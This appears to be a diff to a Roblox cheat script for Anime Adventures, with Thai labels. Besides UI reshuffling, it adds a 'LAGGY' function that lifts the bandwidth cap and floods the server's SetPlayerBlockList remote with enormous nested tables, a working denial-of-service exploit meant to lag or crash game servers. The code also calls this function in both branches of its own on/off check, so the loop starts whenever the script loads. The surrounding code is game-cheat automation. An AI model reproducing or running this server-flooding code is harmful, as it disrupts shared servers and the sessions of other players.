@@ -1,5 +1,6 @@
 --updatefix
 local version = "11.7.5"
+
 ---// Loading Section \\---
 repeat  task.wait() until game:IsLoaded()
 if game.PlaceId == 8304191830 then
@@ -10,6 +11,7 @@ else
     game:GetService("ReplicatedStorage").endpoints.client_to_server.vote_start:InvokeServer()
     repeat task.wait() until game:GetService("Workspace")["_waves_started"].Value == true
 end
+
 ------------------------------
 local a = 'HSz_Anime_Adventures' -- ชื่อโฟเดอร์
 local b = game:GetService('Players').LocalPlayer.Name .. '_AnimeAdventures.json' 
@@ -349,7 +351,7 @@ function BabyWebhook()
                         ["fields"] = {
                             {
                                 ["name"] ="Current Battle Pass Results 🔋 ",
-                                ["value"] = "```ini\nCurrent BTP Lv. : "..btplv.."  🔋\nAMMO TO NEXT : "..nextlvbtp.. "  🔋```",
+                                ["value"] = "```ini\nCurrent BTP Lv. : "..btplv.."  🔋\nNEED TO NEXT : "..nextlvbtp.. "  🔋```",
                             },
                             {
                                 ["name"] ="Current Tournament Results 🏆",
@@ -665,13 +667,23 @@ local ETC = Window:Category(" 🌐 Discord & Shop")
 local AutoSummonSec = ETC:Sector("💸 Auto สุ่ม Units 💸")
 local AutoSnipeMerchantSec = ETC:Sector("🏪 Auto ชื้อของร้านค้า Bulma 🏪")
 local devilcity = ETC:Sector("😈‍ ชื้อ Devil Portal 😈")
-local OtherSec = ETC:Sector("⌛ Auto Load Script ⌛")
---local OtherSec2 = ETC:Sector(" ")
+--local OtherSec = ETC:Sector("⌛ Auto Load Script ⌛")
+local OtherSec2 = ETC:Sector("")
 local WebhookSec = ETC:Sector("🌐 Discord Webhook 🌐")
-local OtherSec3 = ETC:Sector("🐱 Hide Name Player 🐱")
-local DelMapConfig = ETC:Sector("")
-local DelMapConfig2 = ETC:Sector("🗺️ Other Config 🗺️")
+--local OtherSec3 = ETC:Sector("🐱 Hide Name Player 🐱")
+--local DelMapConfig = ETC:Sector("")
+--local DelMapConfig2 = ETC:Sector("🗺️ Other Config 🗺️")
 --local WebhookSec = ETC:Sector("🌐 Discord Webhook 🌐")
+
+local LG = Window:Category("🛠️ Misc [BETA]")
+local LG1 = LG:Sector("Beta LAGGY Config ")
+local OtherSec = LG:Sector("⌛ Auto Load Script ⌛")
+local OtherSec1 = LG:Sector("")
+local OtherSec3 = LG:Sector("🐱 Hide Name Player 🐱")
+local DelMapConfig = LG:Sector("")
+local DelMapConfig2 = LG:Sector("⚙️ Other Config ⚙️")
+
+
 
 -------------
 ---sponsorfix---
@@ -1818,6 +1830,41 @@ local function unitconfig()
         saveSettings()
     end, {placeholder = Settings.U6_SellWave})  
 end
+
+
+---------------------------------------------
+local function LAGGYconfig()
+    LG1:Cheat("Label"," ยังเป็น Beta Version อาจจะยังบัคนะครับ ")
+
+    --[[LG1:Cheat("Textbox", "Lag KeyBind", function(Value)
+        getgenv().zzz = value
+        saveSettings()
+    end, {placeholder = getgenv().zzz})]]
+
+
+    --[[LG1:Cheat("Checkbox"," Enable LAGGY ", function(bool)
+        print(Settings.LaggyL1)
+        Settings.LaggyL1 = bool
+        saveSettings()
+        Laggy()
+    end,{enabled = Settings.LaggyL1})]]
+
+    --[[LG1:Cheat("Slider", "LAG Value", function(Value)
+        print("LAG Value:", Value)
+        Settings.max = tonumber(Value)
+        saveSettings()
+    end, {min = 150, max = 300, suffix = "", default = 150})]]
+
+    LG1:Cheat("Slider", "LAG Lv.", function(Value)
+        print("LAG Lv.:", Value)
+        Settings.mix = tonumber(Value)
+        saveSettings()
+    end, {min = 0.8, max = 7, suffix = "", default = 0.8 })
+
+    LG1:Cheat("Label"," ระดับที่แนะนำ 1 - 3 ครับ ")
+    LG1:Cheat("Label"," เลื่อนให้เป็น 0.8 เพื่อปิดนะครับ ")
+
+end
 ----------------------------------------------
 ---------------- Auto Summon -----------------
 ----------------------------------------------
@@ -2004,6 +2051,7 @@ if game.PlaceId == 8304191830 then
     ChallengeSec()
     DeleteMapSec()
     unitconfig()
+    LAGGYconfig()
     credits()
     sponsor()
     AutoSummon()
@@ -2022,6 +2070,7 @@ else
     DeleteMapSec()
     UnitPosSec()
     unitconfig()
+    LAGGYconfig()
     sponsor()
     credits()
     SnipeMerchant()
@@ -3443,6 +3492,87 @@ end
 if Settings.hidenamep then
     hidename()
 end
+
+----------------------------------
+----------LAGGY CONFIG------------
+----------------------------------
+
+function Laggy()
+    shared.TeleportToSky = false -- for games that show ur ping (like custom duels)
+    
+    if shared.TeleportToSky then
+    local char = game:GetService('Players').LocalPlayer.Character
+    char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
+    task.wait(0.5)
+    char.HumanoidRootPart.Anchored = true
+    end
+    while wait(1.5) do --// don't change it's the best
+    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
+    local function getmaxvalue(val)
+       local mainvalueifonetable = 499999
+       if type(val) ~= "number" then
+           return nil
+       end
+       local calculateperfectval = (mainvalueifonetable/(val+2))
+       return calculateperfectval
+    end
+     
+    local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+    
+    table.insert(spammedtable, {})
+    z = spammedtable[1]
+     
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+     
+    local calculatemax = getmaxvalue(tableincrease)
+    local maximum
+     
+    if calculatemax then
+         maximum = calculatemax
+         else
+         maximum = 999999
+    end
+     
+    for i = 1, maximum do
+         table.insert(maintable, spammedtable)
+    end
+     
+    tries = tonumber(Settings.mix)
+    for i = 1, tries do
+         game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+    end
+end
+    
+    tableincrease = tonumber(Settings.max)
+    tries = tonumber(Settings.mix)
+     
+    bomb(160, tries)
+
+    end
+end
+    
+if Settings.LaggyL1 then
+    if  Laggy() == false then
+        Laggy() 
+    end
+end
+if not Settings.LaggyL1 then
+    if Laggy() == true then
+        notLaggy()
+    end
+end
+
+
+----------------------------------
+-------------END LAGGY------------
+----------------------------------
+
 --delete map 
 function DelMap()
 	task.spawn(function()  -- Hides name for yters (not sure if its Fe)
@@ -3496,6 +3626,7 @@ end
 if Settings.redeemc then
     Reedemcode()
 end
+
 
 warn("HSz Hider Name Loaded สำเร็จ!!!")
 warn("HSz AA v2 Loaded สำเร็จ!!!")
